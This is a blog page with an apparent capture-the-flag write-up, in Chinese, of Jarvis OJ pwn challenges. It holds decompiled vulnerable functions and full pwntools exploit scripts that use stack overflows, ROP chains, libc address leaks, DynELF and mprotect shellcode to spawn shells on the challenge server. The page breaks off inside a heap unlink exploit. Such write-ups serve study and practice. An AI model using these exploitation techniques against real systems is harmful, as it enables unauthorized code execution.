<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
    
    <title>Jarvis OJ-pwn | Room of Requirement | pwn what you want</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="pwn,stack,heap">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"siriuswhiter","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Sirius Whiter</h5>
          <a href="mailto:xuewenjie2017@outlook.com" title="xuewenjie2017@outlook.com" class="mail">
            
              <span>x</span>
            
              <span>u</span>
            
              <span>e</span>
            
              <span>w</span>
            
              <span>e</span>
            
              <span>n</span>
            
              <span>j</span>
            
              <span>i</span>
            
              <span>e</span>
            
              <span>2</span>
            
              <span>0</span>
            
              <span>1</span>
            
              <span>7</span>
            
              <span>@</span>
            
              <span>o</span>
            
              <span>u</span>
            
              <span>t</span>
            
              <span>l</span>
            
              <span>o</span>
            
              <span>o</span>
            
              <span>k</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/siriuswhiter" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
            <li class="">
              <a href="https://github.com/siriuswhiter" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        
	
<header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>Jarvis OJ-pwn</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">Jarvis OJ-pwn</h1>
        <h5 class="subtitle">
            
                <time datetime="2018-09-13T06:17:19.000Z" itemprop="datePublished" class="page-time">
  2018-09-13
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>




<div class="container body-wrap">
    <article id="post-jarvis-oj-pwn"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">Jarvis OJ-pwn</h1>
        <div class="post-meta">
            <time class="post-time" title="2018-09-13 14:17:19" datetime="2018-09-13T06:17:19.000Z"  itemprop="datePublished">2018-09-13</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <p><em>开始漫漫刷题之路</em></p>
<h1 id="level4-DynELF"><a href="#level4-DynELF" class="headerlink" title="level4 - DynELF"></a>level4 - DynELF</h1><p>题目给的东西很少，基本信息如下：</p>
<h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><p>main：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(1, &quot;Hello, World!\n&quot;, 0xEu);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>vulnerable_function：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>保护：只开启了nx。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;/root/pwnprac/level4&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>read很明显会溢出，溢出到返回地址覆盖为system的地址即可，问题在于其地址的寻找，也就是该题的重点：DynELF。<br>最终思路就是因为可以不断的通过调用write函数来leak函数地址，使用dynelf可以通过泄露的地址确定libc版本来确定system地址。<br>/bin/sh则可以通过调用read来将其写入bss段，调用即可。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./level4&apos;)</span><br><span class="line">sh = remote(&apos;pwn2.jarvisoj.com&apos;,9880)</span><br><span class="line">libc = ELF(&apos;./level4&apos;)</span><br><span class="line"></span><br><span class="line">bss_add = libc.bss()   //直接得到bss段地址</span><br><span class="line"></span><br><span class="line">def leak(add):     //leak函数</span><br><span class="line">    pay1 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(add) + p32(4)</span><br><span class="line">    sh.send(pay1)</span><br><span class="line">    data = sh.recv(4)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">#神奇DynELF工具使用</span><br><span class="line">d = DynELF(leak,elf = ELF(&apos;./level4&apos;))   //初始化DynELF模块 </span><br><span class="line">sys_add = d.lookup(&apos;system&apos;,&apos;libc&apos;)      //在libc文件中搜索system函数的地址  </span><br><span class="line"> </span><br><span class="line">print hex(sys_add)</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;read&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(0) + p32(bss_add) + p32(8)    //调用read</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line">sh.send(&apos;/bin/sh\x00&apos;) </span><br><span class="line"></span><br><span class="line">pay3 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(sys_add) + &apos;dead&apos; + p32(bss_add)</span><br><span class="line">sh.send(pay3)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>获得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
<p><em>参考:<a href="&quot;https://blog.csdn.net/u011987514/article/details/68490157&quot;">借助DynELF实现无libc的漏洞利用小结</a></em></p>
<h1 id="level3-x64-64位参数传递"><a href="#level3-x64-64位参数传递" class="headerlink" title="level3_x64 - 64位参数传递"></a>level3_x64 - 64位参数传递</h1><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p>
<p><em>搞了一早上感觉思路完全没毛病，但是poc总是不能用，最终与网上的wp调试比对半天才发现在该文档下的libc-2.19.so文件不是该题的配套libc！！！！！应该是之前某个题的。。。心态爆炸<br>重新下载源文件，问题解决。。。</em></p>
<h2 id="信息："><a href="#信息：" class="headerlink" title="信息："></a>信息：</h2><p>漏洞函数：明显的栈溢出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  write(1, &quot;Input:\n&quot;, 7uLL);</span><br><span class="line">  return read(0, &amp;buf, 0x200uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>整体思路与之前相同：泄露write函数got地址，然后通过调用write函数泄露write真实地址，之后system，/bin/sh什么的手到擒来。所以主要就是练习x64下的参数传递。</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = remote(&apos;pwn2.jarvisoj.com&apos;,9883)</span><br><span class="line">#sh = process(&apos;level3&apos;)</span><br><span class="line">pwn = ELF(&apos;level3_x64&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x004006b3            #pop rdi ; ret</span><br><span class="line">pop_rsi_r15_ret = 0x004006b1      #pop rsi ; pop r15 ; ret</span><br><span class="line"></span><br><span class="line">sys_libc_addr = libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_libc_addr = libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line"></span><br><span class="line">#----------To get write.got--------------# </span><br><span class="line">pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay1 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(1)    //虽然找不到pop_rdx_ret,但是经调试，rdx值大于8，所以我们可以只接受前八个字符即可。</span><br><span class="line">pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;Input:\n&quot;)</span><br><span class="line">sh.send(pay1)</span><br><span class="line">write_addr = u64(sh.recv(8))</span><br><span class="line"></span><br><span class="line">#---------call system func---------------#</span><br><span class="line">sys_addr = write_addr - libc.symbols[&apos;write&apos;] + sys_libc_addr</span><br><span class="line">binsh_addr = write_addr - libc.symbols[&apos;write&apos;] + binsh_libc_addr</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos; </span><br><span class="line">pay2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>获得shell：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h1 id="level5-mmap-amp-amp-mprotect"><a href="#level5-mmap-amp-amp-mprotect" class="headerlink" title="level5 - mmap &amp;&amp; mprotect"></a>level5 - mmap &amp;&amp; mprotect</h1><h2 id="信息-1"><a href="#信息-1" class="headerlink" title="信息"></a>信息</h2><p>同level3_x64 , 假设system 和 execve 被禁用，使用mmap 及mprotect 获取shell</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>先搞清楚mmap 与 mprotect：<br>mmap 就是分配堆内存的那个mmap，原函数为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;sys/mman.h&gt;</span><br><span class="line">void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off);</span><br></pre></td></tr></table></figure>
<p>mprotect，给addr开始的len长度的内存修改权限，原函数为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br></pre></td></tr></table></figure>
<p>所以可以将shellcode写入bss段之类的调用mprotect函数将其可执行，然后返回地址到shellcode处即可；<br>当然也可以mmap分配一段空间然后一样的操作。</p>
<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><p><em>稍微有点问题。。但是找不到，莫得办法。</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#sh = remote(&apos;pwn2.jarvisoj.com&apos;,9884)</span><br><span class="line">sh = process(&apos;level3_x64&apos;)</span><br><span class="line">pwn = ELF(&apos;level3_x64&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x004006b3            #pop rdi ; ret</span><br><span class="line">pop_rsi_r15_ret = 0x004006b1      #pop rsi ; pop r15 ; ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#----------To get write.got--------------#</span><br><span class="line">sh.recv()</span><br><span class="line">pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay1 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(0)    </span><br><span class="line">pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.send(pay1)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">write_addr = u64(sh.recv(8))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">print &quot;write_addr : &quot; + hex(write_addr)</span><br><span class="line"></span><br><span class="line">#----------to get mprotect.got and write shellcode to bss_addr------#</span><br><span class="line"></span><br><span class="line">mprotect_got_addr = write_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;mprotect&apos;]</span><br><span class="line"></span><br><span class="line">print &quot;mprotect_got_addr : &quot;+ hex(mprotect_got_addr)</span><br><span class="line"></span><br><span class="line">bss_addr = pwn.bss()</span><br><span class="line"></span><br><span class="line">print &quot;bss_addr : &quot; + hex(bss_addr)</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay2 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(0) </span><br><span class="line">pay2 += p64(pwn.symbols[&apos;read&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">#-------------------to write bss &amp;&amp; mprotect to .got table----------------#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_got_addr = 0x600a80</span><br><span class="line">mprotect_got_addr = 0x600a78</span><br><span class="line"></span><br><span class="line">pay3 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay3 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss_got_addr) + p64(0) + p64(pwn.symbols[&apos;read&apos;])</span><br><span class="line">pay3 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(mprotect_got_addr) + p64(0) + p64(pwn.symbols[&apos;read&apos;])</span><br><span class="line">pay3 += p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.send(pay3)</span><br><span class="line"></span><br><span class="line">sh.send(p64(bss_got_addr))</span><br><span class="line"></span><br><span class="line">sh.send(p64(mprotect_got_addr))</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line">#---------------------------</span><br><span class="line"></span><br><span class="line">init_start = 0x4006a6</span><br><span class="line">init_end = 0x400690</span><br><span class="line"></span><br><span class="line">pay4 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay4 += p64(init_start) + &apos;bbbbbbbb&apos;</span><br><span class="line">pay4 += p64(0) #rbx</span><br><span class="line">pay4 += p64(1) #rbp</span><br><span class="line">pay4 += p64(mprotect_got_addr) </span><br><span class="line">pay4 += p64(7) #r13-&gt;rdx</span><br><span class="line">pay4 += p64(0x1000) #r14-&gt;rsi</span><br><span class="line">pay4 += p64(0x600000) #r15-&gt;rdi</span><br><span class="line"></span><br><span class="line">pay4 += p64(init_end) + &apos;bbbbbbbb&apos; </span><br><span class="line">pay4 += p64(0) + p64(1) + p64(bss_got_addr) + p64(0)  + p64(0) + p64(0)</span><br><span class="line">pay4 += p64(init_end)</span><br><span class="line"></span><br><span class="line">sh.send(pay4)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="level6-堆的unlink利用"><a href="#level6-堆的unlink利用" class="headerlink" title="level6 - 堆的unlink利用"></a>level6 - 堆的unlink利用</h1><p>正常的选项类型题</p>
<h2 id="信息-2"><a href="#信息-2" class="headerlink" title="信息"></a>信息</h2><p>main:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line"></span><br><span class="line">  alarm_func();</span><br><span class="line">  main_ptr();</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = menu();</span><br><span class="line">LABEL_3:</span><br><span class="line">    switch ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1u:</span><br><span class="line">        list();</span><br><span class="line">        continue;</span><br><span class="line">      case 2u:</span><br><span class="line">        add();</span><br><span class="line">        continue;</span><br><span class="line">      case 3u:</span><br><span class="line">        edit();</span><br><span class="line">        continue;</span><br><span class="line">      case 4u:</span><br><span class="line">        delete();</span><br><span class="line">        v0 = menu();</span><br><span class="line">        if ( v0 &gt; 5 )</span><br><span class="line">          goto LABEL_6;</span><br><span class="line">        goto LABEL_3;</span><br><span class="line">      case 5u:</span><br><span class="line">        puts(&quot;Bye&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">      default:</span><br><span class="line">LABEL_6:</span><br><span class="line">        puts(&quot;Invalid!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>问题函数：<br>delete函数未检查inuse位，可以double free，且free完并未清空指针。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  int v1; // edx</span><br><span class="line">  int v3; // eax</span><br><span class="line"></span><br><span class="line">  if ( *(_DWORD *)(dword_804A2EC + 4) &lt;= 0 )</span><br><span class="line">    return puts(&quot;No notes yet.&quot;);</span><br><span class="line">  printf(&quot;Note number: &quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  if ( v0 &lt; 0 )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  v1 = dword_804A2EC;</span><br><span class="line">  if ( v0 &gt;= *(_DWORD *)dword_804A2EC )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  --*(_DWORD *)(dword_804A2EC + 4);</span><br><span class="line">  v3 = v1 + 12 * v0;</span><br><span class="line">  *(_DWORD *)(v3 + 8) = 0;</span><br><span class="line">  *(_DWORD *)(v3 + 12) = 0;</span><br><span class="line">  free(*(void **)(v3 + 16));</span><br><span class="line">  return puts(&quot;Done.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时add与edit会对输入的大小进行（或许）与0x80的对齐，即向上对齐到0x80,0x100,0x180,0x200这样子。不过只需要输入申请大小的内容即可。</p>
<p>保护：（基本上不用看。。）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/root/pwnprac/freenote_x86&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h2 id="思路-有点迷"><a href="#思路-有点迷" class="headerlink" title="思路(有点迷)"></a>思路(有点迷)</h2><p>   首先分配5个大小为0x80的内存块（0,1,2,3,4），之后按顺序free掉3号与1号（这样1号内存的fd指针会指向3号），这样0号内存块就可以使用1号内存块的pre_size 与size 位，但我们可以<br>edit 0号内存块大小为0x90，目的是为了在对齐机制的情况下，系统会分配0x100大小的内存块，但因为需要输入申请内存大小的内容，所以只要0x90，即<br>刚好覆盖1号内存块的pre_size与size位，此时可以打印出1号内存块的fd指针，从而泄露出堆的基地址与0号内存的地址。<br>    之后unlink，因为delete漏洞的存在，1号块可以double free,将0号块卸下。这样子就可以对0号块为所欲为。(不太懂怎么为所欲为的) </p>
<h2 id="exp（待参透）"><a href="#exp（待参透）" class="headerlink" title="exp（待参透）"></a>exp（待参透）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 